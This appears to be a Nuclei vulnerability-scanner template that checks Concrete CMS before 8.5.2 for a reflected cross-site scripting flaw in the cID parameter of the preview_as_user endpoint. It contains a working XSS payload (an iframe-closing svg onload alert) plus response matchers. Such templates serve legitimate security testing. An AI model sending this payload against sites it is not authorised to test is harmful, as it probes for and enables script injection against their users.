http:
- matchers:
  - part: body
    type: word
    words:
    - </iframe><svg/onload=alert("{{randstr}}")>
  - condition: and
    part: header
    type: word
    words:
    - text/html
    - CONCRETE5
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/ccm/system/panels/page/preview_as_user/preview?cID="></iframe><svg/onload=alert("{{randstr}}")>'
id: concrete-xss
info:
  author: shifacyclewla,hackergautam,djoevanka
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  description: Concrete CMS before 8.5.2 contains a cross-site scripting vulnerability
    in preview_as_user function using cID parameter.
  metadata:
    max-request: 1
  name: Concrete CMS <8.5.2 - Cross-Site Scripting
  reference:
  - https://hackerone.com/reports/643442
  - https://github.com/concrete5/concrete5/pull/7999
  - https://twitter.com/JacksonHHax/status/1389222207805661187
  severity: high
  tags: hackerone,concrete,xss,cms,unauth,intrusive,vuln
